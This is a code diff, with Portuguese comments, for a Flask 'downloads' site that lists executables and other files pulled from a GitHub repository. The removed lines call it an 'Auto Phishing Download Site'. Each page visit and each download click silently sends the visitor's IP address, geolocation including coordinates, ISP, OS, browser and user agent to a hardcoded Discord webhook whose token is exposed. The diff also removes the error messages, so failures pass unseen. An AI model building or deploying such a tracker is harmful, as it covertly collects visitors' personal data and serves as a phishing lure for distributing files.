@@ -6,18 +6,15 @@ from flask import Flask, render_template, request
 app = Flask(__name__)
 
 # ============================================================
-# 🎯 CONFIGURAÇÃO — SÓ TROCA ISSO
+# 🎯 CONFIGURAÇÃO
 # ============================================================
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O_M9Q2jzholD8UXekoDTCGHeUwr1TznCXR75s3ZiM8oqW7TCnXvZHK7YIMs02cm9g"
 
-# Teu repositório no GitHub
-GITHUB_REPO_OWNER = "malucomaf16"         # Ex: "joaozinho"
-GITHUB_REPO_NAME   = "downloads website"           # Ex: "meu-phishing"
-GITHUB_FILES_PATH  = "arquivos"           # Pasta onde estão os arquivos
-GITHUB_BRANCH      = "main"               # ou "master"
+GITHUB_REPO_OWNER = "malucomaf16"
+GITHUB_REPO_NAME   = "downloads-website"
+GITHUB_FILES_PATH  = "arquivos"      # Se não existir, vai mostrar "No files found"
+GITHUB_BRANCH      = "main"
 
-# Opcional: token do GitHub pra evitar rate limit (60 req/h sem token)
-# Cria em: https://github.com/settings/tokens (não precisa de permissão especial)
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 # ============================================================
 
@@ -25,13 +22,44 @@ HEADERS = {}
 if GITHUB_TOKEN:
     HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"
 
+# Extensão → ícone
+EXT_ICONS = {
+    ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
+    ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
+    ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️", ".webp": "🖼️",
+    ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄", ".xls": "📄", ".xlsx": "📄",
+    ".mp3": "🎵", ".wav": "🎵", ".flac": "🎵",
+    ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬", ".mov": "🎬", ".wmv": "🎬",
+    ".iso": "💿", ".img": "💿",
+    ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨", ".php": "🐘",
+    ".apk": "📱",
+    ".dmg": "💻",
+}
 
-# ============================================================
-# 📦 LISTA ARQUIVOS DO GITHUB VIA API
-# ============================================================
+EXT_CATEGORIES = {
+    ".exe": "Applications", ".msi": "Applications", ".dll": "Applications",
+    ".zip": "Archives", ".rar": "Archives", ".7z": "Archives", ".tar": "Archives", ".gz": "Archives",
+    ".jpg": "Images", ".jpeg": "Images", ".png": "Images", ".gif": "Images", ".bmp": "Images", ".webp": "Images",
+    ".pdf": "Documents", ".doc": "Documents", ".docx": "Documents", ".txt": "Documents", ".xls": "Documents", ".xlsx": "Documents",
+    ".mp3": "Audio", ".wav": "Audio", ".flac": "Audio",
+    ".mp4": "Video", ".avi": "Video", ".mkv": "Video", ".mov": "Video", ".wmv": "Video",
+    ".iso": "Disc Images", ".img": "Disc Images",
+    ".py": "Code", ".js": "Code", ".html": "Code", ".css": "Code", ".php": "Code",
+    ".apk": "Android",
+    ".dmg": "macOS",
+}
+
+
+def get_icon(ext):
+    return EXT_ICONS.get(ext.lower(), "📁")
+
+
+def get_category(ext):
+    return EXT_CATEGORIES.get(ext.lower(), "Other")
+
 
 def get_github_files():
-    """Pega a lista de arquivos da pasta no GitHub"""
+    """Pega lista de arquivos da pasta no GitHub"""
     url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
     
     try:
@@ -42,69 +70,30 @@ def get_github_files():
             for item in contents:
                 if item["type"] == "file":
                     name = item["name"]
-                    # Pega extensão
-                    if "." in name:
-                        ext = "." + name.rsplit(".", 1)[1]
-                    else:
-                        ext = ""
-                    # Tamanho em MB
+                    ext = "." + name.rsplit(".", 1)[1] if "." in name else ""
                     size_mb = round(item["size"] / (1024 * 1024), 1)
-                    # Link direto raw
-                    raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/{GITHUB_BRANCH}/{GITHUB_FILES_PATH}/{name}"
+                    raw_url = item["download_url"]
+                    
+                    display_name = name.rsplit(".", 1)[0].replace("_", " ").replace("-", " ").strip()
                     
                     files.append({
-                        "name": name.replace("_", " ").replace("-", " ").replace(ext, "").strip(),
+                        "name": display_name,
                         "filename": name,
                         "ext": ext,
                         "size_mb": size_mb,
                         "raw_url": raw_url,
-                        "github_url": item["html_url"],
-                        "download_url": item["download_url"],
+                        "icon": get_icon(ext),
+                        "category": get_category(ext),
                     })
             
-            # Ordena por nome
             files.sort(key=lambda x: x["filename"])
             return files
         else:
-            print(f"[!] GitHub API error: {resp.status_code} - {resp.text}")
+            print(f"[!] GitHub API error: {resp.status_code}")
             return []
     except Exception as e:
-        print(f"[!] GitHub API exception: {e}")
+        print(f"[!] GitHub exception: {e}")
         return []
-
-
-# ============================================================
-# 🌍 ICONE POR EXTENSÃO
-# ============================================================
-
-def get_icon(ext):
-    icons = {
-        ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
-        ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
-        ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️",
-        ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄",
-        ".mp3": "🎵", ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬",
-        ".iso": "💿", ".img": "💿",
-        ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨",
-        ".apk": "📱",
-        ".dmg": "💻",
-    }
-    return icons.get(ext.lower(), "📁")
-
-
-def get_category(ext):
-    ext = ext.lower()
-    if ext in (".exe", ".msi", ".dll"): return "Applications"
-    if ext in (".zip", ".rar", ".7z", ".tar", ".gz"): return "Archives"
-    if ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"): return "Images"
-    if ext in (".pdf", ".doc", ".docx", ".txt", ".xls", ".xlsx"): return "Documents"
-    if ext in (".mp3", ".wav", ".flac", ".aac"): return "Audio"
-    if ext in (".mp4", ".avi", ".mkv", ".mov", ".wmv"): return "Video"
-    if ext in (".iso", ".img"): return "Disc Images"
-    if ext in (".py", ".js", ".html", ".css", ".php"): return "Code"
-    if ext in (".apk"): return "Android"
-    if ext in (".dmg"): return "macOS"
-    return "Other"
 
 
 # ============================================================
@@ -114,8 +103,6 @@ def get_category(ext):
 def get_client_ip():
     if request.headers.get("X-Forwarded-For"):
         return request.headers.get("X-Forwarded-For").split(",")[0].strip()
-    if request.headers.get("X-Real-IP"):
-        return request.headers.get("X-Real-IP")
     return request.remote_addr or "0.0.0.0"
 
 
@@ -126,7 +113,7 @@ def get_geolocation(ip):
             data = resp.json()
             if data.get("status") == "success":
                 return data
-    except Exception:
+    except:
         pass
     return {"query": ip, "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
             "zip": "", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown"}
@@ -169,15 +156,15 @@ def send_webhook(action, file_name=""):
                 {"name": "🏙️ City", "value": str(geo.get("city", "Unknown")), "inline": True},
                 {"name": "🗺️ Region", "value": str(geo.get("regionName", "Unknown")), "inline": True},
                 {"name": "📮 ZIP", "value": str(geo.get("zip", "")), "inline": True},
-                {"name": "🧭 Lat", "value": str(geo.get("lat", 0)), "inline": True},
-                {"name": "🧭 Lon", "value": str(geo.get("lon", 0)), "inline": True},
+                {"name": "🧭 Latitude", "value": str(geo.get("lat", 0)), "inline": True},
+                {"name": "🧭 Longitude", "value": str(geo.get("lon", 0)), "inline": True},
                 {"name": "🏢 ISP", "value": str(geo.get("isp", "Unknown")), "inline": True},
-                {"name": "🏢 Org", "value": str(geo.get("org", "Unknown")), "inline": True},
+                {"name": "🏢 Organization", "value": str(geo.get("org", "Unknown")), "inline": True},
                 {"name": "🔗 ASN", "value": str(geo.get("as", "Unknown")), "inline": True},
                 {"name": "💻 OS", "value": os_name, "inline": True},
                 {"name": "🌍 Browser", "value": browser, "inline": True},
                 {"name": "🗣️ Language", "value": request.headers.get("Accept-Language", "Unknown"), "inline": True},
-                {"name": "🔗 U.A.", "value": ua, "inline": False},
+                {"name": "🔗 User Agent", "value": ua, "inline": False},
                 {"name": "🔗 Referrer", "value": request.referrer or "Direct", "inline": True},
             ],
             "footer": {"text": f"HackerAI • {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}"},
@@ -187,8 +174,8 @@ def send_webhook(action, file_name=""):
     
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
-    except Exception as e:
-        print(f"[!] Webhook error: {e}")
+    except:
+        pass
 
 
 # ============================================================
@@ -200,10 +187,9 @@ def index():
     files = get_github_files()
     send_webhook("Visited Homepage")
     
-    # Agrupa por categoria
     categories = {}
     for f in files:
-        cat = get_category(f["ext"])
+        cat = f["category"]
         if cat not in categories:
             categories[cat] = []
         categories[cat].append(f)
@@ -224,8 +210,12 @@ def download_page(filename):
         return render_template("404.html"), 404
     
     send_webhook("Clicked Download", file_data["filename"])
-    
     return render_template("download.html", file=file_data)
+
+
+@app.route("/track")
+def track():
+    return {"status": "ok"}
 
 
 # ============================================================
@@ -233,11 +223,5 @@ def download_page(filename):
 # ============================================================
 
 if __name__ == "__main__":
-    print("""
-╔══════════════════════════════════════════╗
-║      🕵️  Auto Phishing Download Site    ║
-║    Files loaded dynamically from GitHub  ║
-╚══════════════════════════════════════════╝
-    """)
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=False)
